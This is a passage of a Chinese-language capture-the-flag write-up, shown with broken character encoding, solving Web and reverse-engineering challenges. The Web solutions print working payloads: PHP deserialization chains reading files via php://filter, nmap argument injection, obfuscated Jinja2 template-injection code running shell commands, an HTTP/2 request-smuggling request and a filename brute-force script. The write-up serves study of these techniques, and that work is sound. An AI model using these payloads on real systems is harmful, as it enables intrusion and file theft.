00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f*</code></p><p>POST: <code>ctf=DirectoryIterator</code></p><p>å¾—åˆ°flagæ–‡ä»¶åä¸º <code>flag_my_baby.php</code>ã€‚</p><p>å†è¯»flagæ–‡ä»¶ï¼š</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php</code></p><p>POST: <code>ctf=SplFileObject</code></p><p>ç»“æœbase64è§£ç å³å¾—flagã€‚</p><p>â€‹    </p><h3 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h3><blockquote><p>nmapä¹Ÿå¤ªå¥½ç”¨äº†ï¼ä¸æ˜¯å§ï¼Œä½ è¿˜ä¸ä¼šç”¨å—ï¼Ÿ</p></blockquote><p>è¿‡æ»¤äº† <code>?  php flag iL oN</code></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_43801002/article/details/107746582">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</a></p><p>ä½¿ç”¨nmapè¯»æ–‡ä»¶ï¼Œé€‰é¡¹ <code>-oA</code>ï¼Œè¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚</p><p>ä½¿ç”¨ <code>?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;</code>ï¼Œå†è®¿é—® <code>1.nmap</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h3><blockquote><p>â€å¯æ¶ï¼Œæˆ‘ä¸ä¿¡ï¼Œæˆ‘ç»å¯¹ä¸æ˜¯klfï¼Œä½ ä»¬æ‰æ˜¯ï¼Œå“ˆå“ˆè¿™æ¬¡æˆ‘å·åœŸé‡æ¥äº†ï¼Œä½ ä»¬è‚¯å®šæ˜¯klfï¼Œæˆ‘è¦å‘å¥³ç¥è¯æ˜è‡ªå·±â€¦â€œ</p></blockquote><p><code>robots.txt</code> å¾—è·¯ç”± <code>/secr3ttt</code>ï¼Œæµ‹è¯•è¿‡æ»¤å…³é”®å­—æœ‰ï¼š</p><p><code>[ ] _  &#39; &quot; \ config init globals os import request open read 0 137 pop</code></p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagæ–‡ä»¶å <code>fl4gfl4gfl4g</code>ï¼Œå†è¯»flagæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EZ-Smuggling"><a href="#EZ-Smuggling" class="headerlink" title="EZ_Smuggling"></a>EZ_Smuggling</h3><blockquote><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„H2è½¬H1çš„å°ç½‘ç«™ï¼Œç«™é•¿è®¤ä¸ºä»–å¾ˆå®‰å…¨ï¼Œæ²¡æœ‰äººèƒ½åœ¨ä»–çš„ç½‘ç«™èµ°ç§ä»»ä½•ä¸œè¥¿ã€‚ é¢˜ç›®é“¾æ¥:<a href="https://47.108.56.168:20231/">https://47.108.56.168:20231/</a> å¤‡ç”¨é“¾æ¥1:<a href="https://47.108.56.168:20232/">https://47.108.56.168:20232/</a> å¤‡ç”¨é“¾æ¥2:<a href="https://47.108.56.168:20233/">https://47.108.56.168:20233/</a></p></blockquote><p>H2.CLè¯·æ±‚èµ°ç§ï¼Œå‚è€ƒï¼š</p><p><a href="https://sc.scomurr.com/http-request-smuggling-http-2-downgrade-attack-part-2/">HTTP Request Smuggling â€“ HTTP/2 Downgrade Attack Part 2</a></p><p>æ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/2</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>å³å¯å¾—flagï¼š<code>SYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h3><blockquote><p>â€å¥½å¥½å¥½è¿™éƒ½ç»™ä½ ä»¬åšå‡ºæ¥äº†ï¼Œè¿™æ¬¡æˆ‘æ‹œæ‰˜äº†pursue0hå¸®æˆ‘æ”¶é›†äº†ä½ ä»¬å‰å‡ æ¬¡çš„payloadï¼Œè¿™æ¬¡ç»å¯¹ä¸å¯èƒ½è®©ä½ ä»¬åšå‡ºæ¥ï¼Œä½ ä»¬ç»å¯¹æ˜¯klfâ€œ</p></blockquote><p><code>robots.txt</code>  å¾—åˆ°è·¯ç”± <code>/secr3ttt</code>ï¼ŒåŒklf_2ç›¸åŒæ‰“æ³•å³å¯ã€‚</p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagæ–‡ä»¶å <code>fl4gfl4gfl4g</code>ï¼Œå†è¯»flagæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h3><blockquote><p>æœ€é€‚åˆæ¢…è²æ–¯ç‰¹çš„ä¸€é¢˜</p></blockquote><p>globåè®®ä¾§ä¿¡é“çˆ†ç ´æ–‡ä»¶åã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Idol</span>:</span><br><span class="line">    public_Akane=<span class="string">&#x27;glob:///etc/passss&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hoshino</span>:</span><br><span class="line">    public_Ruby=Idol()</span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">b&#x27;&quot;Hoshino&quot;:1&#x27;</span>,<span class="string">b&#x27;&quot;Hoshino&quot;:2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(res))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment"># ç»•wakeup</span></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        guess = <span class="string">f&#x27;glob:///var/www/html/The<span class="subst">&#123;name+j&#125;</span><span class="subst">&#123;<span class="string">&quot;*&quot;</span>*(<span class="number">23</span>-<span class="built_in">len</span>(name))&#125;</span>.php&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;<span class="built_in">len</span>(guess)&#125;</span>:&quot;<span class="subst">&#123;guess&#125;</span>&quot;;&#125;&#125;&#125;&#125;&#x27;</span>.encode()</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;base64.b64encode(payload).decode()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kurokawa Akane&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            name += j</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure><p>å†è®¿é—® <code>/var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php</code> å³å¯å¾—flagã€‚</p><p>â€‹    </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h3><blockquote><p>è·³åˆ°å“ªé‡Œå»äº†ï¼Ÿ</p></blockquote><p>ç”¨IDAè§£æç¨‹åºå´©æºƒï¼Œæ”¹ç”¨Ghidraè§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uStack12;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  uStack12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x21</span> &lt; (<span class="type">int</span>)uStack12) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar1 = func_0x00101070();</span><br><span class="line">    <span class="keyword">if</span> ((uVar1 ^ uStack12) != (<span class="type">int</span>)(<span class="type">char</span>)rodata[uStack12]) <span class="keyword">break</span>;</span><br><span class="line">    uStack12 = uStack12 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºç®€å•å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rodata = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;</span>))</span><br><span class="line">flag = [rodata[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"><a href="#ç‚¹å‡»å°±é€çš„é€†å‘é¢˜" class="headerlink" title="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"></a>ç‚¹å‡»å°±é€çš„é€†å‘é¢˜</h3><blockquote><p>ä»£ç å¦‚ä½•åˆ°å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶?(è®°å¾—å°†å¾—åˆ°çš„æ­£ç¡®å­—ç¬¦ä¸²åŒ…è£¹ä¸ŠSYC{}!!!!!!!)</p></blockquote><p>å°†sæ–‡ä»¶ç¼–è¯‘ï¼š<code>gcc xxx.s -o xxx</code></p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">__isoc99_scanf(&amp;unk_2004, s1);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  s1[i] += <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºROT7ï¼Œcyberchefè¿˜åŸä¸º <code>SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</code>ã€‚</p><p>flagï¼š<code>SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</code></p><p>â€‹    </p><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><blockquote><p>åˆ«æ‹…å¿ƒï¼Œæ²¡å­¦è¿‡çº¿æ€§ä»£æ•°ä¹Ÿå¯ä»¥åšå‡ºæ¥ï¼Œå¬è¯´z3è€å¸ˆå¾ˆå‰å®³ã€‚flagè¯·ä½¿ç”¨SYC{}åŒ…è£¹ã€‚</p></blockquote><p>å‰éƒ¨åˆ†ä»£ç ä¸º $\mathbb{Z}_{32}$ ä¸‹çŸ©é˜µä¹˜æ³•ï¼š$L \cdot M = I$</p><p>åéƒ¨åˆ†ä»£ç ï¼Œæ ¹æ®ä»£ç æµ‹è¯•ä»£ç é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">pos = [table.index(flag[i])+<span class="number">48</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(pos))</span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">last = [num[k-<span class="number">48</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos]</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºå°†flagæŒ‰ç…§numæ¥ç¼–åºå·ã€‚</p><p>è¿˜åŸè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">M = matrix(Zmod(<span class="number">32</span>), [[<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>], [<span class="number">8</span>, <span class="number">31</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>], [<span class="number">29</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">29</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>], [<span class="number">11</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">7</span>]])</span><br><span class="line">I = identity_matrix(Zmod(<span class="number">32</span>), <span class="number">5</span>)</span><br><span class="line">L = I*M^-<span class="number">1</span></span><br><span class="line">m = L.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span 